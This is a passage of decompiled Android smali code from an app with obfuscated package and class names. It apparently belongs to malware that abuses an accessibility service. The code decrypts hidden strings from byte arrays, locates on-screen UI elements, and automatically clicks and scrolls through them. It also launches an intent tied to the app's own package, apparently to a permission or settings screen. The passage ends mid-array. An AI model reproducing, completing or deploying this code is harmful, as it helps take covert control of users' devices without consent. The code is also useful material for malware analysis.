    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->h1(Landroid/accessibilityservice/AccessibilityService;)V

    goto :goto_1

    :cond_5
    :goto_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->X0()V

    :goto_1
    return-void
.end method

.method private static C1(I)V
    .locals 3

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->O:Ljava/lang/String;

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->c(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v1, 0x1f4

    const/4 v2, 0x0

    if-eqz v0, :cond_1

    :try_start_0
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    if-eqz p0, :cond_0

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    sput-boolean v2, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->n:Z

    sput-boolean v2, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->k:Z

    const/4 p0, 0x1

    sput-boolean p0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->l:Z

    goto :goto_0

    :catch_0
    move-exception p0

    goto :goto_1

    :cond_0
    sput-boolean v2, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->n:Z

    :goto_0
    invoke-static {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->G1()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    :goto_1
    invoke-virtual {p0}, Ljava/lang/Throwable;->printStackTrace()V

    goto :goto_2

    :cond_1
    if-lez p0, :cond_2

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v1, 0x22

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v2, v2, [B

    fill-array-data v2, :array_1

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_3

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isScrollable()Z

    move-result v1

    if-eqz v1, :cond_3

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->b3(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    const/16 v0, 0xc8

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    add-int/lit8 p0, p0, -0x1

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->C1(I)V

    goto :goto_2

    :cond_2
    sput-boolean v2, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->n:Z

    sput-boolean v2, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->k:Z

    invoke-static {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->G1()V

    :cond_3
    :goto_2
    return-void

    :array_0
    .array-data 1
        -0x46t
        0x6ft
        0x54t
        -0x72t
        -0x22t
        -0x4ct
        0x0t
        -0x4t
        -0x56t
        0x2et
        0x5bt
        -0x3ft
        -0x3bt
        -0x50t
        0x9t
        -0x5t
        -0x60t
        0x3at
        0x50t
        -0x3ct
        -0x62t
        -0x4at
        0x9t
        -0x16t
        -0x60t
        0x63t
        0x55t
        -0x3bt
        -0x3dt
        -0x65t
        0x1at
        -0x20t
        -0x44t
        0x77t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x27t
        0x0t
        0x39t
        -0x60t
        -0x4ft
        -0x3ct
        0x6ct
        -0x77t
    .end array-data
.end method

.method private static synthetic C2(Landroid/content/Context;)V
    .locals 5

    .line 1
    const/4 v0, 0x5

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sget-object v2, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {p0, v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    new-instance v0, Landroid/content/Intent;

    const/16 v2, 0x35

    new-array v2, v2, [B

    fill-array-data v2, :array_2

    new-array v3, v1, [B

    fill-array-data v3, :array_3

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    new-array v4, v1, [B

    fill-array-data v4, :array_4

    new-array v1, v1, [B

    fill-array-data v1, :array_5

    invoke-static {v4, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-direct {v0, v2, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v1, 0x40000000    # 2.0f

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/gz;

    invoke-direct {v1, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/gz;-><init>(Landroid/content/Context;)V

    const-wide/16 v2, 0x320

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void

    nop

    :array_0
    .array-data 1
        -0x7bt
        0x7bt
        -0x36t
        0x12t
        -0x12t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0xbt
        0x1et
        -0x48t
        0x74t
        -0x73t
        -0x32t
        -0x4ct
        -0x6at
    .end array-data

    :array_2
    .array-data 1
        0x67t
        0x52t
        0x7bt
        0x62t
        -0x7bt
        -0x14t
        -0x5at
        -0x8t
        0x75t
        0x59t
        0x6bt
        0x64t
        -0x7dt
        -0x15t
        -0x5bt
        -0x5bt
        0x28t
        0x6et
        0x5at
        0x41t
        -0x41t
        -0x40t
        -0x6ft
        -0x7et
        0x59t
        0x75t
        0x58t
        0x5et
        -0x5bt
        -0x29t
        -0x79t
        -0x77t
        0x44t
        0x7dt
        0x4bt
        0x44t
        -0x51t
        -0x29t
        -0x65t
        -0x77t
        0x49t
        0x6ct
        0x4bt
        0x59t
        -0x59t
        -0x34t
        -0x68t
        -0x69t
        0x52t
        0x75t
        0x50t
        0x5et
        -0x47t
    .end array-data

    nop

    :array_3
    .array-data 1
        0x6t
        0x3ct
        0x1ft
        0x10t
        -0x16t
        -0x7bt
        -0x3et
        -0x2at
    .end array-data

    :array_4
    .array-data 1
        0x19t
        -0xat
        0xct
        -0x12t
        0x26t
        -0x55t
        0x3dt
        0x6ft
    .end array-data

    :array_5
    .array-data 1
        0x69t
        -0x69t
        0x6ft
        -0x7bt
        0x47t
        -0x34t
        0x58t
        0x55t
    .end array-data
.end method

.method public static synthetic D(Landroid/os/Handler;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->h2(Landroid/os/Handler;)V

    return-void
.end method

.method private static D0(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 3

    .line 1
    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->o:Z

    if-nez v0, :cond_1

    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->w:Z

    if-nez v0, :cond_1

    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->b:Z

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result p0

    const/16 v1, 0x20

    const/4 v2, 0x0

    if-ne p0, v1, :cond_0

    const/4 p0, 0x1

    goto :goto_0

    :cond_0
    move p0, v2

    :goto_0
    and-int/2addr p0, v0

    if-eqz p0, :cond_1

    sput-boolean v2, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->b:Z

    const/16 p0, 0x320

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    const/4 p0, 0x2

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->J0(I)V

    :cond_1
    return-void
.end method

.method private static D1(I)V
    .locals 10

    .line 1
    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->k:Z

    const/16 v1, 0xf

    const/16 v2, 0x25

    const/16 v3, 0x3e8

    const/4 v4, 0x0

    const/16 v5, 0xc8

    const/16 v6, 0x8

    if-eqz v0, :cond_6

    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->u:Z

    if-eqz v0, :cond_6

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->B:[Ljava/lang/String;

    array-length v7, v0

    :goto_0
    if-ge v4, v7, :cond_2

    aget-object v8, v0, v4

    sget-object v9, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-static {v9, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->c(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v8

    if-eqz v8, :cond_1

    invoke-virtual {v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v9

    if-eqz v9, :cond_1

    invoke-virtual {v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->U0(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    move-result p0

    if-eqz p0, :cond_0

    invoke-static {v3}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->B1()V

    goto :goto_1

    :cond_0
    new-instance p0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$x;

    invoke-direct {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$x;-><init>()V

    invoke-static {v8, p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->L0(Landroid/view/accessibility/AccessibilityNodeInfo;Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ui;)V

    :goto_1
    return-void

    :cond_1
    add-int/lit8 v4, v4, 0x1

    goto :goto_0

    :cond_2
    if-lez p0, :cond_5

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    new-array v2, v2, [B

    fill-array-data v2, :array_0

    new-array v3, v6, [B

    fill-array-data v3, :array_1

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_3

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isScrollable()Z

    move-result v2

    if-eqz v2, :cond_3

    :goto_2
    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->b3(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {v5}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    add-int/lit8 p0, p0, -0x1

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->D1(I)V

    goto/16 :goto_6

    :cond_3
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    new-array v1, v1, [B

    fill-array-data v1, :array_2

    new-array v2, v6, [B

    fill-array-data v2, :array_3

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_4

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isScrollable()Z

    move-result v1

    if-eqz v1, :cond_4

    :goto_3
    goto :goto_2

    :cond_4
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->Z2()V

    goto/16 :goto_6

    :cond_5
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->j1()V

    goto/16 :goto_6

    :cond_6
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->A:[Ljava/lang/String;

    array-length v7, v0

    :goto_4
    if-ge v4, v7, :cond_9

    aget-object v8, v0, v4

    sget-object v9, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-static {v9, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->c(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v8

    if-eqz v8, :cond_8

    invoke-virtual {v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v9

    if-eqz v9, :cond_8

    invoke-virtual {v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->U0(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    move-result p0

    if-eqz p0, :cond_7

    invoke-static {v3}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->E1()V

    goto :goto_5

    :cond_7
    new-instance p0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$a;

    invoke-direct {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$a;-><init>()V

    invoke-static {v8, p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->L0(Landroid/view/accessibility/AccessibilityNodeInfo;Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ui;)V

    :goto_5
    return-void

    :cond_8
    add-int/lit8 v4, v4, 0x1

    goto :goto_4

    :cond_9
    if-lez p0, :cond_5

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    new-array v2, v2, [B

    fill-array-data v2, :array_4

    new-array v3, v6, [B

    fill-array-data v3, :array_5

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_a

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isScrollable()Z

    move-result v2

    if-eqz v2, :cond_a

    goto :goto_3

    :cond_a
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    new-array v1, v1, [B

    fill-array-data v1, :array_6

    new-array v2, v6, [B

    fill-array-data v2, :array_7

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_4

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isScrollable()Z

    move-result v1

    if-eqz v1, :cond_4

    goto/16 :goto_2

    :goto_6
    return-void

    nop

    :array_0
    .array-data 1
        -0x21t
        0x48t
        -0x30t
        0x2ft
        -0x8t
        0x55t
        -0x47t
        0x77t
        -0x2dt
        0x4et
        -0x27t
        0x2ft
        -0x16t
        0x5et
        -0x57t
        0x71t
        -0x2bt
        0x49t
        -0x26t
        0x72t
        -0x5dt
        0x52t
        -0x47t
        0x2at
        -0x32t
        0x42t
        -0x22t
        0x78t
        -0x6t
        0x57t
        -0x48t
        0x77t
        -0x1dt
        0x51t
        -0x2ct
        0x64t
        -0x12t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x44t
        0x27t
        -0x43t
        0x1t
        -0x67t
        0x3bt
        -0x23t
        0x5t
    .end array-data

    :array_2
    .array-data 1
        -0x72t
        -0x55t
        0x6ft
        -0x2ct
        0x0t
        -0x18t
        -0x75t
        0x13t
        -0x7at
        -0x5ft
        0x24t
        -0x36t
        0x6t
        -0xet
        -0x65t
    .end array-data

    :array_3
    .array-data 1
        -0x11t
        -0x3bt
        0xbt
        -0x5at
        0x6ft
        -0x7ft
        -0x11t
        0x29t
    .end array-data

    :array_4
    .array-data 1
        -0x23t
        -0x46t
        -0x6bt
        0x26t
        -0x14t
        0x7t
        -0xet
        0x79t
        -0x2ft
        -0x44t
        -0x64t
        0x26t
        -0x2t
        0xct
        -0x1et
        0x7ft
        -0x29t
        -0x45t
        -0x61t
        0x7bt
        -0x49t
        0x0t
        -0xet
        0x24t
        -0x34t
        -0x50t
        -0x65t
        0x71t
        -0x12t
        0x5t
        -0xdt
        0x79t
        -0x1ft
        -0x5dt
        -0x6ft
        0x6dt
        -0x6t
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x42t
        -0x2bt
        -0x8t
        0x8t
        -0x73t
        0x69t
        -0x6at
        0xbt
    .end array-data

    :array_6
    .array-data 1
        0x5dt
        0x0t
        0x59t
        0x7ct
        -0x4ft
        0x41t
        -0x7bt
        -0x33t
        0x55t
        0xat
        0x12t
        0x62t
        -0x49t
        0x5bt
        -0x6bt
    .end array-data

    :array_7
    .array-data 1
        0x3ct
        0x6et
        0x3dt
        0xet
        -0x22t
        0x28t
        -0x1ft
        -0x9t
    .end array-data
.end method

.method private static synthetic D2(Landroid/content/Context;)V
    .locals 4

    .line 1
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1e

    if-lt v0, v1, :cond_0

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/s1;->a()Z

    move-result v0

    if-nez v0, :cond_0

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->c1()V

    :cond_0
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/bz;

    invoke-direct {v1, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/bz;-><init>(Landroid/content/Context;)V

    const-wide/16 v2, 0x9c4

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method

.method public static synthetic E(Landroid/content/Context;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->z2(Landroid/content/Context;)V

    return-void
.end method

.method private static E0(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 7

    .line 1
    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->w:Z

    const/4 v1, 0x1

    const/16 v2, 0x20

    const/16 v3, 0x8

    const/4 v4, 0x0

    if-nez v0, :cond_1

    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->j:Z

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v5

    if-ne v5, v2, :cond_0

    move v5, v1

    goto :goto_0

    :cond_0
    move v5, v4

    :goto_0
    and-int/2addr v0, v5

    const/16 v5, 0x38

    new-array v5, v5, [B

    fill-array-data v5, :array_0

    new-array v6, v3, [B

    fill-array-data v6, :array_1

    invoke-static {v5, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getClassName()Ljava/lang/CharSequence;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    and-int/2addr v0, v5

    if-eqz v0, :cond_1

    sput-boolean v4, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->j:Z

    const/16 v0, 0x1f4

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->O0()V

    :cond_1
    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->w:Z

    if-nez v0, :cond_4

    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->m:Z

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v5

    if-ne v5, v2, :cond_2

    goto :goto_1

    :cond_2
    move v1, v4

    :goto_1
    and-int/2addr v0, v1

    if-eqz v0, :cond_4

    const/16 v0, 0x34

    new-array v0, v0, [B

    fill-array-data v0, :array_2

    new-array v1, v3, [B

    fill-array-data v1, :array_3

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getClassName()Ljava/lang/CharSequence;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_3

    const/16 v0, 0x36

    new-array v0, v0, [B

    fill-array-data v0, :array_4

    new-array v1, v3, [B

    fill-array-data v1, :array_5

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getClassName()Ljava/lang/CharSequence;

    move-result-object p0

    invoke-virtual {v0, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_4

    :cond_3
    sput-boolean v4, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->m:Z

    const/16 p0, 0x3e8

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->z0()V

    :cond_4
    return-void

    nop

    :array_0
    .array-data 1
        -0x48t
        -0x62t
        0x0t
        0x52t
        -0x14t
        0x2bt
        -0x37t
        -0x4at
        -0x4ct
        -0x68t
        0x9t
        0x52t
        -0x2t
        0x20t
        -0x27t
        -0x50t
        -0x4et
        -0x61t
        0xat
        0xft
        -0x5dt
        0x24t
        -0x23t
        -0x4ct
        -0x49t
        -0x68t
        0xet
        0x1dt
        -0x7t
        0x2ct
        -0x3et
        -0x56t
        -0x58t
        -0x21t
        0x24t
        0x12t
        -0x2t
        0x31t
        -0x34t
        -0x58t
        -0x49t
        -0x6ct
        0x9t
        0x3dt
        -0x3t
        0x35t
        -0x17t
        -0x5ft
        -0x51t
        -0x70t
